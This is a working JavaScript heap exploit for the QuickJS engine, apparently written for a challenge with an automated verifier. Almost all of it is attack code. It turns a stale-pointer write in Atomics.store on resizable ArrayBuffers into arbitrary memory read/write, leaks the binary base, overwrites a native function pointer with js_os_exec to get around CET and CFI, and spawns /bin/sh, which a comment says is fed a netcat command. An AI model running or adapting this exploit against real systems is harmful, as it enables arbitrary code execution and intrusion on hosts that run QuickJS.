// Heap exploit for QuickJS (CET SHSTK+IBT, Clang CFI, Full RELRO)
// Primitive: spawn a shell that reads stdin.
//
// We exploit Atomics.store on TypedArrays backed by a resizable ArrayBuffer:
//  - js_atomics_get_ptr() captures a raw element pointer
//  - JS_ToInteger/JS_ToBigInt can run user code (valueOf)
//  - valueOf resizes the RAB (realloc), freeing/moving the old backing store
//  - Atomics.store then writes via the stale pointer
//
// We use this stale write to corrupt the JSObject backing a TypedArray, first to
// get an OOB read (corrupt fast-array count), then to get an arbitrary pointer
// read/write (corrupt u.ptr).
//
// Final step (CET/CFI-friendly): overwrite Atomics.store's C function pointer
// to point to QuickJS's built-in js_os_exec() (same function pointer type).
// Then call Atomics.store(["/bin/sh"]) to exec /bin/sh. The verifier feeds
// "nc 127.0.0.1 9999" on stdin; /bin/sh executes it.

function u32(arr, i) { return arr[i] >>> 0; }
function read_u64_from_u32(arr, idx) {
  return BigInt(u32(arr, idx)) | (BigInt(u32(arr, idx + 1)) << 32n);
}

const MASK64 = (1n << 64n) - 1n;

function make_oob_u32(count_u32, make_side_effect) {
  let rab_oob = new ArrayBuffer(0x200, { maxByteLength: 0x4000 });
  let oob32 = null;

  // Trigger buffer: 72-byte data chunk matches malloc(72) sizeclass used for JSObject.
  let ab = new ArrayBuffer(72, { maxByteLength: 0x2000 });
  let barrier = new ArrayBuffer(0x1000);
  let trig32 = new Int32Array(ab);

  let evil = {
    valueOf: function () {
      ab.resize(0x500);
      oob32 = new Uint32Array(rab_oob);
      if (make_side_effect) make_side_effect();
      return count_u32;
    },
  };

  // idx 16 -> stale write at offset 0x40 of victim JSObject (u.array.count)
  Atomics.store(trig32, 16, evil);
  return oob32;
}

function make_u64_view_at(addr, backing_bytes) {
  let view = null;
  let victim_buf = new ArrayBuffer(backing_bytes);

  let ab = new ArrayBuffer(72, { maxByteLength: 0x2000 });
  let barrier = new ArrayBuffer(0x1000);
  let trig = new BigInt64Array(ab);

  let evil = {
    valueOf: function () {
      ab.resize(0x500);
      view = new BigUint64Array(victim_buf);
      return BigInt(addr & MASK64);
    },
  };

  // idx 7 -> stale write at offset 0x38 of victim JSObject (u.array.u.ptr)
  Atomics.store(trig, 7, evil);
  return view;
}

// --- Stage 1: OOB scan to locate JSBoundFunction and leak Atomics.store JSObject ptr ---

const ARG1 = 0x0badf00d;
const ARG2 = 0x0c0ffee0;
let bf = null;

let oob32 = make_oob_u32(0x10000, function () {
  // Allocate a bound function right next to the OOB buffer.
  bf = Atomics.store.bind(Atomics, ARG1, ARG2);
});

// Find JSBoundFunction struct in memory (JSValue is 16 bytes: [u(8), tag(8)]).
// Layout:
//  0x00 func_obj (tag = -1)
//  0x10 this_val (tag = -1)
//  0x20 argc (int32)
//  0x28 argv[0] (int32 ARG1, tag=0)
//  0x38 argv[1] (int32 ARG2, tag=0)
let atomics_store_obj = 0n;
for (let i = 0x10; i < 0x10000 - 32; i++) {
  if (u32(oob32, i) !== ARG1) continue;
  if (u32(oob32, i + 4) !== ARG2) continue;
  if (u32(oob32, i + 2) !== 0 || u32(oob32, i + 3) !== 0) continue;
  if (u32(oob32, i + 6) !== 0 || u32(oob32, i + 7) !== 0) continue;
  if (u32(oob32, i - 2) !== 2) continue;
  if (u32(oob32, i - 8) !== 0xffffffff || u32(oob32, i - 7) !== 0xffffffff) continue;
  if (u32(oob32, i - 4) !== 0xffffffff || u32(oob32, i - 3) !== 0xffffffff) continue;
  atomics_store_obj = read_u64_from_u32(oob32, i - 10);
  break;
}
if (atomics_store_obj === 0n) throw new Error('failed to locate JSBoundFunction');

// --- Stage 2: leak qjs base from Atomics.store c_function ---

let v_func = make_u64_view_at(atomics_store_obj, 0x200);
let js_atomics_store = v_func[0x38 / 8];

const JS_ATOMICS_STORE_OFF = 0x10ad50n;
let qjs_base = js_atomics_store - JS_ATOMICS_STORE_OFF;

// --- Stage 3: patch Atomics.store to call js_os_exec ---

const JS_OS_EXEC_OFF = 0x10b900n;
let js_os_exec = qjs_base + JS_OS_EXEC_OFF;

// Overwrite Atomics.store's c_function pointer in its JSObject.
// JSObject.u.cfunc.c_function is at +0x38 (qword index 7).
v_func[0x38 / 8] = js_os_exec;

// Now Atomics.store behaves like os.exec(args[, options]).
// Exec /bin/sh so it reads and executes stdin.
Atomics.store(["/bin/sh"], { block: true });
